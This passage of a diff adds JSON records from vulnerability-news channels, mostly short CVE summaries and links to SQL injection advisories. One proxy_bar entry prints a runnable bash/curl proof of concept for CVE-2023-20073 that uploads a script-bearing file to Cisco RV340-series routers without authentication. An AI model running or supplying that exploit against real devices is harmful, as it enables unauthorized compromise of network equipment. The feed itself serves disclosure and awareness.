+    "message": "‼ CVE-2023-24515 ‼\n\nServer-Side Request Forgery (SSRF) vulnerability in API checker of Pandora FMS. Application does not have a check on the URL scheme used while retrieving API URL. Rather than validating the http/https scheme, the application allows other scheme such as file, which could allow a malicious user to fetch internal file content. This issue affects Pandora FMS v767 version and prior versions on all platforms.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2020-27418 ‼\n\nA Use After Free vulnerability in Fedora Linux kernel 5.9.0-rc9 allows attackers to obatin sensitive information via vgacon_invert_region() function.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2020-21896 ‼\n\nA Use After Free vulnerability in svg_dev_text_span_as_paths_defs function in source/fitz/svg-device.c in Artifex Software MuPDF 1.16.0 allows remote attackers to cause a denial of service via opening of a crafted PDF file.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "defcon_news",
+    "message": "Fluent CMS 1.0.0 SQL Injection\nhttps://packetstormsecurity.com/files/174261/fluentcms100-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174261/fluentcms100-sql.txt"
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "defcon_news",
+    "message": "Color Prediction Game 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174260/cpg10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174260/cpg10-sql.txt"
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "defcon_news",
+    "message": "Global Multi School Management System Express 1.0 SQL Injection\nhttps://packetstormsecurity.com/files/174259/gmsmse10-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174259/gmsmse10-sql.txt"
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "defcon_news",
+    "message": "OVOO Movie Portal CMS 3.3.3 SQL Injection\nhttps://packetstormsecurity.com/files/174258/ovoompcms333-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174258/ovoompcms333-sql.txt"
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "defcon_news",
+    "message": "Taskhub CRM Tool 2.8.6 SQL Injection\nhttps://packetstormsecurity.com/files/174257/taskhubcrmtool286-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174257/taskhubcrmtool286-sql.txt"
+}
+{
+    "date": "2023-08-22",
+    "from_channel": "defcon_news",
+    "message": "FastMatch Iddaa Tahmin Scripti 2.0 SQL Injection\nhttps://packetstormsecurity.com/files/174250/fmits20-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174250/fmits20-sql.txt"
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-25915 ‼\n\nDue to improper input validation, a remote attacker could execute arbitrary commands on the target system.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "defcon_news",
+    "message": "Credit Lite 1.5.4 SQL Injection\nhttps://packetstormsecurity.com/files/174244/creditlite154-sql.txt",
+    "urls": [],
+    "webpage_description": "Information Security Services, News, Files, Tools, Exploits, Advisories and Whitepapers",
+    "webpage_url": "https://packetstormsecurity.com/files/174244/creditlite154-sql.txt?utm_source=dlvr.it&utm_medium=twitter"
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38899 ‼\n\nSQL injection vulnerability in berkaygediz O_Blog v.1.0 allows a local attacker to escalate privileges via the secure_file_priv component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4453 ‼\n\nCross-site Scripting (XSS) - Reflected in GitHub repository pimcore/pimcore prior to 10.6.8.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-3481 ‼\n\nCritters versions 0.0.17-0.0.19 have an issue when parsing the HTML, which leads to a potential cross-site scripting (XSS) bug. We recommend upgrading to version 0.0.20 of the extension.Â \n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-46751 ‼\n\nImproper Restriction of XML External Entity Reference, XML Injection (aka Blind XPath Injection) vulnerability in Apache Software Foundation Apache Ivy.This issue affects any version of Apache Ivy prior to 2.5.2.When Apache Ivy prior to 2.5.2 parses XML files - either its own configuration, Ivy files or Apache Maven POMs - it will allow downloading external document type definitions and expand any entity references contained therein when used.This can be used to exfiltrate data, access resources only the machine running Ivy has access to or disturb the execution of Ivy in different ways.Starting with Ivy 2.5.2 DTD processing is disabled by default except when parsing Maven POMs where the default is to allow DTD processing but only to include a DTD snippet shipping with Ivy that is needed to deal with existing Maven POMs that are not valid XML files but are nevertheless accepted by Maven. Access can be be made more lenient via newly introduced system properties where needed.Users of Ivy prior to version 2.5.2 can use Java system properties to restrict processing of external DTDs, see the section about \"JAXP Properties for External Access restrictions\" inside Oracle's \"Java API for XML Processing (JAXP) Security Guide\".\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39543 ‼\n\nCross-site scripting vulnerability in LuxCal Web Calendar prior to 5.2.3M (MySQL version) and LuxCal Web Calendar prior to 5.2.3L (SQLite version) allows a remote unauthenticated attacker to execute an arbitrary script on the web browser of the user who is using the product.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39939 ‼\n\nSQL injection vulnerability in LuxCal Web Calendar prior to 5.2.3M (MySQL version) and LuxCal Web Calendar prior to 5.2.3L (SQLite version) allows a remote unauthenticated attacker to execute arbitrary queries against the database and obtain or alter the information in it.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "proxy_bar",
+    "message": "CVE-2023-36874 \nуязвимость в службе отчетов об ошибках, связанная с повышением привилегий, позволявшая получить права администратора на устройстве Windows.\n*\nPOC exploit\n*\nRead - exploit for 0-day Windows Error Reporting Service bug\n#windows #lpe"
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4438 ‼\n\nA vulnerability has been found in SourceCodester Inventory Management System 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file app/ajax/search_sales_report.php. The manipulation of the argument customer leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used. The associated identifier of this vulnerability is VDB-237559.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4440 ‼\n\nA vulnerability was found in SourceCodester Free Hospital Management System for Small Practices 1.0. It has been classified as critical. This affects an unknown part of the file appointment.php. The manipulation of the argument sheduledate leads to sql injection. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-237561 was assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4436 ‼\n\nA vulnerability, which was classified as critical, has been found in SourceCodester Inventory Management System 1.0. This issue affects some unknown processing of the file app/action/edit_update.php. The manipulation of the argument user_id leads to sql injection. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. The identifier VDB-237557 was assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-21",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4437 ‼\n\nA vulnerability, which was classified as critical, was found in SourceCodester Inventory Management System 1.0. Affected is an unknown function of the file app/ajax/search_sell_paymen_report.php. The manipulation of the argument customer leads to sql injection. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. VDB-237558 is the identifier assigned to this vulnerability.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4451 ‼\n\nCross-site Scripting (XSS) - Reflected in GitHub repository cockpit-hq/cockpit prior to 2.6.4.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-20",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4435 ‼\n\nImproper Input Validation in GitHub repository hamza417/inure prior to build88.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-19",
+    "from_channel": "proxy_bar",
+    "message": "CVE-2023-20073\nЗагрузка произвольного файла без проверки подлинности  (XSS) в VPN-маршрутизаторах:\nCisco RV340, RV340W, RV345, RV345P \nUsage:\n#!/usr/bin/bash\nTARGET=\"https://0.0.0.0\"; \\\nFILENAME=\"login.html\"; \\\necho \"<b>CVE-2023-20073</b> exploit test.<br><script>alert('JS-test')</script>\" > $FILENAME; \\\ncurl -ksX POST \"$TARGET/api/operations/ciscosb-file:form-file-upload\" -H \"Authorization: 1\" -F \"pathparam=Portal\" -F \"fileparam=${FILENAME}\" -F \"file.path=${FILENAME}\" -F \"file=@${FILENAME};type=application/octet-stream\"; \\\necho \"Access the uploaded file through the following link: $TARGET/$FILENAME\"\n\n#cisco",
+    "urls": []
+}
+{
+    "date": "2023-08-19",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2318 ‼\n\nDOM-based XSS in src/muya/lib/contentState/pasteCtrl.js in MarkText 0.17.1 and before on Windows, Linux and macOS allows arbitrary JavaScript code to run in the context of MarkText main window. This vulnerability can be exploited if a user copies text from a malicious webpage and paste it into MarkText.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-19",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2317 ‼\n\nDOM-based XSS in updater/update.html in Typora before 1.6.7 on Windows and Linux allows a crafted markdown file to run arbitrary JavaScript code in the context of Typora main window via loading typora://app/typemark/updater/update.html in <embed> tag. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-19",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38839 ‼\n\nSQL injection vulnerability in Kidus Minimati v.1.0.0 allows a remote attacker to obtain sensitive information via theID parameter in the fulldelete.php component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4422 ‼\n\nCross-site Scripting (XSS) - Stored in GitHub repository cockpit-hq/cockpit prior to 2.6.3.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38911 ‼\n\nA Cross-Site Scripting (XSS) vulnerability in CSZ CMS 1.3.0 allows attackers to execute arbitrary code via a crafted payload to the Gallery parameter in the YouTube URL fields.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38890 ‼\n\nOnline Shopping Portal Project 3.1 allows remote attackers to execute arbitrary SQL commands/queries via the login form, leading to unauthorized access and potential data manipulation. This vulnerability arises due to insufficient validation of user-supplied input in the username field, enabling SQL Injection attacks.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38910 ‼\n\nCSZ CMS 1.3.0 is vulnerable to cross-site scripting (XSS), which allows attackers to execute arbitrary web scripts or HTML via a crafted payload entered in the 'Carousel Wiget' section and choosing our carousel widget created above, in 'Photo URL' and 'YouTube URL' plugin.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32130 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Daniel Powney Multi Rating plugin <=Â 5.0.6 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32122 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Spiffy Plugins Spiffy Calendar plugin <=Â 4.9.3 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31228 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in CreativeMindsSolutions CM On Demand Search And Replace plugin <=Â 1.3.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31094 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Lauri Karisola / WP Trio Stock Sync for WooCommerce plugin <=Â 2.4.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-4407 ‼\n\nA vulnerability classified as critical was found in Codecanyon Credit Lite 1.5.4. Affected by this vulnerability is an unknown functionality of the file /portal/reports/account_statement of the component POST Request Handler. The manipulation of the argument date1/date2 leads to sql injection. The attack can be launched remotely. The associated identifier of this vulnerability is VDB-237511.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39445 ‼\n\nHidden functionality vulnerability in LAN-WH300N/RE all versions provided by LOGITEC CORPORATION allows an unauthenticated attacker to execute arbitrary code by sending a specially crafted file to the product's certain management console.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-35991 ‼\n\nHidden functionality vulnerability in LOGITEC wireless LAN routers allows an unauthenticated attacker to log in to the product's certain management console and execute arbitrary OS commands. Affected products and versions are as follows: LAN-W300N/DR all versions, LAN-WH300N/DR all versions, LAN-W300N/P all versions, LAN-WH450N/GP all versions, LAN-WH300AN/DGP all versions, LAN-WH300N/DGP all versions, and LAN-WH300ANDGPE all versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39454 ‼\n\nBuffer overflow vulnerability in WRC-X1800GS-B v1.13 and earlier, WRC-X1800GSA-B v1.13 and earlier, and WRC-X1800GSH-B v1.13 and earlier allows an unauthenticated attacker to execute arbitrary code.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39415 ‼\n\nImproper authentication vulnerability in Proself Enterprise/Standard Edition Ver5.61 and earlier, Proself Gateway Edition Ver1.62 and earlier, and Proself Mail Sanitize Edition Ver1.07 and earlier allow a remote unauthenticated attacker to log in to the product's Control Panel and perform an unintended operation.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-32626 ‼\n\nHidden functionality vulnerability in LAN-W300N/RS all versions, and LAN-W300N/PR5 all versions allows an unauthenticated attacker to log in to the product's certain management console and execute arbitrary OS commands.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38132 ‼\n\nLAN-W451NGR all versions provided by LOGITEC CORPORATION contains an improper access control vulnerability, which allows an unauthenticated attacker to log in to telnet service.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-18",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-30875 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in All My Web Needs Logo Scheduler plugin <=Â 1.2.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31945 ‼\n\nSQL injection vulnerability found in Online Travel Agency System v.1.0 allows a remote attacker to execute arbitrary code via the id parameter at daily_expenditure_edit.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31944 ‼\n\nSQL injection vulnerability found in Online Travel Agency System v.1.0 allows a remote attacker to execute arbitrary code via the emp_id parameter at employee_edit.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39971 ‼\n\nImproper Neutralization of Input During Web Page Generation vulnerability in AcyMailing Enterprise component for Joomla allows XSS. This issue affects AcyMailing Enterprise component for Joomla: 6.7.0-8.6.3.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31940 ‼\n\nSQL injection vulnerability found in Online Travel Agency System v.1.0 allows a remote attacker to execute arbitrary code via the page_id parameter at article_edit.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31943 ‼\n\nSQL injection vulnerability found in Online Travel Agency System v.1.0 allows a remote attacker to execute arbitrary code via the ticket_id parameter at ticket_detail.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31938 ‼\n\nSQL injection vulnerability found in Online Travel Agency System v.1.0 allows a remote attacker to execute arbitrary code via the emp_id parameter at employee_detail.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31939 ‼\n\nSQL injection vulnerability found in Online Travel Agency System v.1.0 allows a remote attacker to execute arbitrary code via the costomer_id parameter at customer_edit.php.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38905 ‼\n\nSQL injection vulnerability in Jeecg-boot v.3.5.0 and before allows a local attacker to cause a denial of service via the Benchmark, PG_Sleep, DBMS_Lock.Sleep, Waitfor, DECODE, and DBMS_PIPE.RECEIVE_MESSAGE functions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2917 ‼\n\nThe Rockwell Automation Thinmanager Thinserver is impacted by an improper input validation vulnerability.Â Â Due to an improper input validation, a path traversal vulnerability exists, via the filename field, when the ThinManager processes a certain function. If exploited, an unauthenticated remote attacker can upload arbitrary files to any directory on the disk drive where ThinServer.exe is installed. Â A malicious user could exploit this vulnerability by sending a crafted synchronization protocol message and potentially gain remote code execution abilities.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2915 ‼\n\nThe Rockwell Automation Thinmanager Thinserver is impacted by an improper input validation vulnerability, Due to improper input validation, a path traversal vulnerability exists when the ThinManager software processes a certain function. If exploited, an unauthenticated remote threat actor can delete arbitrary files with system privileges. A malicious user could exploit this vulnerability by sending a specifically crafted synchronization protocol message resulting in a denial-of-service condition.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-2914 ‼\n\nThe Rockwell Automation Thinmanager Thinserver is impacted by an improper input validation vulnerability, an integer overflow condition exists in the affected products. When the ThinManager processes incoming messages, a read access violation occurs and terminates the process. A malicious user could exploit this vulnerability by sending a crafted synchronization protocol message and causing a denial of service condition in the software.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28783 ‼\n\nAuth. (shop manager+) Stored Cross-Site Scripting (XSS) vulnerability in PHPRADAR Woocommerce Tip/Donation plugin <=Â 1.2 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31072 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Praveen Goswami Advanced Category Template plugin <=Â 0.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28693 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Balasaheb Bhise Advanced Youtube Channel Pagination plugin <=Â 1.0 version.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31079 ‼\n\nAuth. (contributor+) Stored Cross-Site Scripting (XSS) vulnerability in Chris Roberts Tippy plugin <=Â 6.2.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38838 ‼\n\nSQL injection vulnerability in Kidus Minimati v.1.0.0 allows a remote attacker to obtain sensitive information via the edit.php component.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-26530 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Paul Kehrer Updraft plugin <=Â 0.6.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31091 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Pradeep Singh Dynamically Register Sidebars plugin <=Â 1.0.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31074 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in hupe13 Extensions for Leaflet Map plugin <=Â 3.4.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28533 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in M Williams Cab Grid plugin <=Â 1.5.15 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-28622 ‼\n\nAuth. (author+) Stored Cross-Site Scripting (XSS) vulnerability in Trident Technolabs Easy Slider Revolution plugin <=Â 1.0.0 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-40252 ‼\n\nImproper Control of Generation of Code ('Code Injection') vulnerability in Genians Genian NAC V4.0, Genians Genian NAC V5.0, Genians Genian NAC Suite V5.0, Genians Genian ZTNA allows Replace Trusted Executable.This issue affects Genian NAC V4.0: from V4.0.0 through V4.0.155; Genian NAC V5.0: from V5.0.0 through V5.0.42 (Revision 117460); Genian NAC Suite V5.0: from V5.0.0 through V5.0.54; Genian ZTNA: from V6.0.0 through V6.0.15.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31071 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Yannick Lefebvre Modal Dialog plugin <=Â 3.5.14 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-30877 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Maxim Glazunov XML for Google Merchant Center plugin <=Â 3.0.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-30876 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Dave Ross Dave's WordPress Live Search plugin <=Â 4.8.1 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-30874 ‼\n\nAuth. (admin+) Stored Cross-Site Scripting (XSS) vulnerability in Steve Curtis, St. Pete Design Gps Plotter plugin <=Â 5.1.4 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-17",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-31076 ‼\n\nUnauth. Reflected Cross-Site Scripting (XSS) vulnerability in Really Simple Plugins Recipe Maker For Your Food Blog from Zip Recipes plugin <=Â 8.0.6 versions.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-38347 ‼\n\nAn issue was discovered in LWsystems Benno MailArchiv 2.10.1. Attackers can cause XSS via JavaScript content to a mailbox.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-37068 ‼\n\nCode-Projects Gym Management System V1.0 allows remote attackers to execute arbitrary SQL commands via the login form, leading to unauthorized access and potential data manipulation. This vulnerability arises due to insufficient validation of user-supplied input in the username and password fields, enabling SQL Injection attacks.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2023-39007 ‼\n\n/ui/cron/item/open in the Cron component of OPNsense before 23.7 allows XSS.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48592 ‼\n\nA SQL injection vulnerability exists in the vendor_country parameter of the â€œvendor print reportâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48599 ‼\n\nA SQL injection vulnerability exists in the â€œreporter events typeâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48598 ‼\n\nA SQL injection vulnerability exists in the â€œreporter events type dateâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48591 ‼\n\nA SQL injection vulnerability exists in the vendor_state parameter of the â€œvendor print reportâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
+    "message": "‼ CVE-2022-48595 ‼\n\nA SQL injection vulnerability exists in the â€œticket template watchersâ€� feature of the ScienceLogic SL1 that takes unsanitized user?controlled input and passes it directly to a SQL query. This allows for the injection of arbitrary SQL before being executed against the database.\n\n📖 Read\n\nvia \"National Vulnerability Database\"."
+}
+{
+    "date": "2023-08-09",
+    "from_channel": "cibsecurity",
